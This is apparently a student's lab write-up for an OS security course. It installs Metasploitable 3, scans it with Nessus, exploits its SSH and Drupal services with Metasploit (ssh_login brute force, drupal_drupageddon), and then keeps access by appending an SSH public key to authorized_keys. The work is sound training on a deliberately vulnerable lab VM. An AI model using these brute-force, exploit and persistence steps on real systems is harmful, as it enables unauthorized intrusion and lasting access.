# Lab 4 OS security

### Name: Mohamad Nour Shahin

### Group number: B22-CBS-01

# Questions to Answer

## Task 1

[Setup Metasploitable 3)](https://github.com/rapid7/metasploitable3).

---

### Solution:

To install metasploitable 3, I used Vagrant for this. As a prerequisite, I installed virtualbox also:

```command
sudo dpkg -i ~/Downloads/virtualbox-7.0_7.0.20-163906~Ubuntu~jammy_amd64.deb
sudo apt-get install -f

```

![alt text](image-10.png)
![alt text](image-11.png)

I will install Vagrant RPM file for x86_64 system from [here](https://developer.hashicorp.com/vagrant/install) and installed it using:

```command
sudo rpm -i vagrant-2.4.1-1.x86_64.rpm
vagrant --version
```

![alt text](image-9.png)

After that, I downloaded the Vagrantfle from [Metasploitable 3 Github Repo](https://github.com/rapid7/metasploitable3) .

```command
mkdir metasploitable3-workspace
cd metasploitable3-workspace
wget -O- https://apt.releases.hashicorp.com/gpg | sudo gpg --dearmor -o /usr/share/keyrings/hashicorp-archive-keyring.gpgcd metasploitable3-workspace
curl -O https://raw.githubusercontent.com/rapid7/metasploitable3/master/Vagrantfile
```

Since I needed to work on the linux version only, I modified the Vagrant file to following:

```ruby
# -*- mode: ruby -*-
# vi: set ft=ruby :

Vagrant.configure("2") do |config|
  config.vm.synced_folder '.', '/vagrant', disabled: true
  config.vm.define "ub1404" do |ub1404|
    ub1404.vm.box = "rapid7/metasploitable3-ub1404"
    ub1404.vm.hostname = "metasploitable3-ub1404"
    config.ssh.username = 'vagrant'
    config.ssh.password = 'vagrant'

    ub1404.vm.network "private_network", ip: '192.168.56.3'

    ub1404.vm.provider "virtualbox" do |v|
      v.name = "Metasploitable3-ub1404"
      v.memory = 2048
    end
  end
end
```

Here, `ip 192.168.56.3` would be the IP address of my server.

I will use command:

```command
vagrant up
```

![alt text](image-12.png)

i will open virtualbox to check it:

![alt text](image-13.png)

---

## Task 2

Install any vulnerability scanning application on the Kali machine (or any other machine), and run a vulnerability scan against your metasploitable 3 machines. Export the report as PDF and include it in your submission.

> Some vulnerability scanning tools are:

- Nessus Essentials
- OpenVAS (Greenbone)
  >

---

### Solution:

I installed Nessus Essentials on Linux mint using [Nessuswebsite](https://www.tenable.com/downloads/nessus?loginAttempted=true) :

![alt text](image-19.png)

install it using command:

```command
sudo dpkg -i Nessus-10.8.3-ubuntu1604_amd64.deb
```

![alt text](image-20.png)

start Nessus Scanner by running this command as he told us below:

```command
/bin/systemctl start nessusd.service
```

![alt text](image-21.png)

click on the [https://mohamad-lenovo-ideapad-520-15ikb:8834/#/](https://mohamad-lenovo-ideapad-520-15ikb:8834/#/) address to redirect us to configure the Nessus.

![alt text](image-22.png)

Select the option of ‘Register for Nessus Essentials’ and Continue.

![alt text](image-23.png)

![alt text](image-24.png)

![alt text](image-25.png)

Nessus tool interface as follows. We need to wait until all plugins complete the compilation. You will see the status of that on the top-right.

![alt text](image-26.png)

![alt text](image-27.png)

Everything is ready we know that our target ip address is `ip 192.168.56.3` :

![alt text](image-28.png)

![alt text](image-29.png)

I have chosen Advanced Scan for this example

![alt text](image-30.png)

![alt text](image-31.png)

Once you save your scan, you will see it in your scan lists. Here we need to click on the play ikon which means Launch.

![alt text](image-34.png)

final results:

![alt text](image-35.png)

---

## Task 3

Use the Metasploit framework to exploit 2 vulnerabilities in any of the services running on the Metasploitable machines.

Hint:

[Metasploitable 3 Vulnerabilities](https://github.com/rapid7/metasploitable3/wiki/Vulnerabilities)

### Solution:

Firstly, I installed nmap, metasploite framework:

```command
sudo apt-get install nmap
```

![alt text](image-36.png)

I did an nmap scan and tried to find the open ports using command:

```command
sudo nmap -sV -O 192.168.56.3 -p0-65535
```

![alt text](image-37.png)

We found that several open ports can be exploited, and I will choose port 22 ssh and 80 http

Start Metasploit with msfconsole using command:

```command
msfconsole
```

### SSH_login

![alt text](image-38.png)

Search for the SSH_login credential to exploit it using command:

```command
search ssh_login
```

![alt text](image-41.png)

![alt text](image-42.png)

Now we have to set all these parameters, to do this simply give the commands listed below one by one.

use it using command:

```command
show options
set RHOST 192.168.56.3
set VERBOSE true
set STOP_ON_SUCCESS true
set USER_FILE /usr/share/users.txt
set PASS_FILE /usr/share/pass.txt
show options

```

![alt text](image-46.png)
![alt text](image-47.png)

Give the ‘run’ or ‘exploit’ command, the tool will do the rest

![alt text](image-48.png)

I tried to access the shell and running commands:
![alt text](image-49.png)

### Drupal exploits on metasploit

![alt text](image-50.png)

use command:

```commmand
use exploit/multi/http/drupal_drupageddon
```

![alt text](image-51.png)

```commmand
show options
set RHOSTS 192.168.56.3
set TARGETURI /drupal/
```

![alt text](image-52.png)
![alt text](image-53.png)

Give the ‘run’ or ‘exploit’ command, the tool will do the rest

```commmand
run
```

![alt text](image-54.png)

we can see that we have access to the file by running the list files command.

---

## Task 4

Maintain persistence on the compromised Metasploitable machine.

>

Hint: TA0003
More hints: T1098.004, T1053.003, T1053.005, T1505.003

>

---

### Solution:

1. On your attacker machine (your local machine), generate an SSH key pair

  ```command
  ssh-keygen -t rsa -b 2048
  ```
this will create two files:

>
~/.ssh/id_rsa (your private key)
~/.ssh/id_rsa.pub (your public key)
>

2. Access the Compromised Machine using ssh bruteforce that we did it in the third task with username :vagrand, and password: vagrant:


3. Copy Your Public Key to authorized_keys using command:

```command
echo "<your_public_key>" >> .ssh/authorized_keys
```



4. Verify SSH Access using command:

```command
ssh -i ~/.ssh/id_rsa root@192.168.56.3
```

---
